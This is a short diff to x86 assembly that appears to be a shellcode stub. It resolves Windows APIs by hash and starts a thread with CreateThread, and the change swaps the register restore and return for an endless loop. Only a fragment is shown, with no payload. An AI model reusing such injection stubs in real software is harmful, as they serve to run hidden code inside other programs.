@@ -15,8 +15,6 @@
 
 ;%define VirtualAlloc
 
-	pushad						; Save all registers to stack
-	pushfd						; Save all flags to stack
 	cld							; Clear out direction flags
 	call Start					; Start OP
 	%include "HASH-API.asm"		; hash_api
@@ -72,6 +70,5 @@ CreateThread:
   	call ebp 					; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   	jmp OpEnd					; <-
 OpEnd:
-	popfd						; Put back all saved flags
-	popad						; Put back all saved registers
-	ret							; Continue the execution
+	nop							; Chill :P
+	jmp OpEnd					; To infinity and beyond !!
